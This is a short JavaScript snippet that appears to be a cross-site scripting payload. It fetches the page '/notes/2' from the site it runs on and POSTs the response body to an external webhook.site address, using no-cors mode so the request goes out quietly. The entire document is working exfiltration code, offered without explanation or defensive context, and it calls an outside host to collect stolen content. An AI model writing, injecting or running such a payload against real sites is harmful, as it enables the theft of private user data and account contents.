fetch('/notes/2')
    .then(r => r.text()) // Fetches the response as text
    .then(d => fetch('https://webhook.site/2a4e63aa-4297-40aa-a983-46ee14dc0f24', {
        method: 'POST',
        mode: 'no-cors',
        body: d,
        headers: {
            'Content-Type': 'text/plain' // Corrected the content-type header
        }
    }))
